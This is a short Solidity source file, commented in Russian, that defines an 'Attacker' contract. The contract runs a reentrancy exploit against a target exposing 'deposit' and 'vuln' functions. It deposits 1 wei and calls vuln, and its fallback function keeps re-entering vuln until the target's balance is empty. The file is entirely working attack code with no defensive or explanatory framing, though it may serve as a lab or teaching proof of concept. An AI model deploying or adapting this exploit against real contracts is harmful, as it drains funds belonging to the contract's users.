pragma solidity ^0.8.7;

interface ITarget {
	function vuln(uint256 amount) external;
	function deposit() external payable;
}

contract Attacker {
	ITarget private target;
	address private owner;
	constructor(address _target) public payable { // вносим в контракт атакующего минимальный баланс в размере 1 wei.
		target = ITarget(_target);
		owner = msg.sender;
	}
	function exploit() external {
		require(msg.sender == owner);
		target.deposit{value:1 wei}(); // вносим минимальный баланс
		target.vuln(1);}
	fallback() external payable {
		if (address(target).balance > 0) { // если баланс не нулевой, декрементируем и повторно входим в vuln функцию
			target.vuln(1);
		}
	}
}
